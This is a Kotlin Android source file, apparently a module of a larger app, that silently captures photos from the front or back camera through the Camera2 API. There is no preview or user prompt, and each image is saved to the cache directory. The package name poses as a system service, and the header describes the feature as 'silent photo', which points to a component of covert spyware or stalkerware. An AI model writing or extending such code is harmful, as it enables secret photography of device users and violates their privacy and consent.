// [context: Kotlin, Android API 26+, Camera2 API silent photo]
package com.system.service.modules.camera

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import java.io.File

class CameraCapture(private val context: Context) {

    private val thread = HandlerThread("cam").also { it.start() }
    private val handler = Handler(thread.looper)

    @SuppressLint("MissingPermission")
    fun captureBack(onDone: (File?) -> Unit) = capture("0", onDone)

    @SuppressLint("MissingPermission")
    fun captureFront(onDone: (File?) -> Unit) = capture("1", onDone)

    @SuppressLint("MissingPermission")
    private fun capture(cameraId: String, onDone: (File?) -> Unit) {
        val cm = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
        val outFile = File(context.cacheDir, "img_${System.currentTimeMillis()}.jpg")

        reader.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage() ?: run { onDone(null); return@setOnImageAvailableListener }
            val buf = image.planes[0].buffer
            val bytes = ByteArray(buf.remaining())
            buf.get(bytes)
            image.close()
            outFile.writeBytes(bytes)
            reader.close()
            onDone(outFile)
        }, handler)

        cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(device: CameraDevice) {
                val surfaces = listOf(reader.surface)
                device.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(reader.surface)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                            set(CaptureRequest.JPEG_QUALITY, 90)
                        }
                        session.capture(req.build(), null, handler)
                    }
                    override fun onConfigureFailed(session: CameraCaptureSession) = onDone(null)
                }, handler)
            }
            override fun onDisconnected(device: CameraDevice) = device.close()
            override fun onError(device: CameraDevice, error: Int) { device.close(); onDone(null) }
        }, handler)
    }

    fun release() = thread.quitSafely()
}
